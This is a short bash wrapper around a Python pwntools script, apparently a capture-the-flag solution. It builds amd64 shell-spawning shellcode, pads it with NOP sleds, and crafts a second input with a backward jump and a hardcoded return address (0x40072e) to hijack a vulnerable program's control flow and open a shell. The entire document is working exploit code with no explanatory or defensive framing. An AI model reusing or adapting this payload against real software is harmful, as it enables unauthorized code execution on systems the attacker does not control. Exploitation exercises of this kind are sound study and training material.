#!/bin/bash

python3 << 'EOF'
from pwn import *
context.arch = 'amd64'

shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')
second_input = b'\x90' * 8 + b'\xeb\xb6' + b'\x90' * 13 + p32(0x40072e) + b'\x90'

import sys
sys.stdout.buffer.write(first_input)
sys.stdout.buffer.write(second_input)
EOF
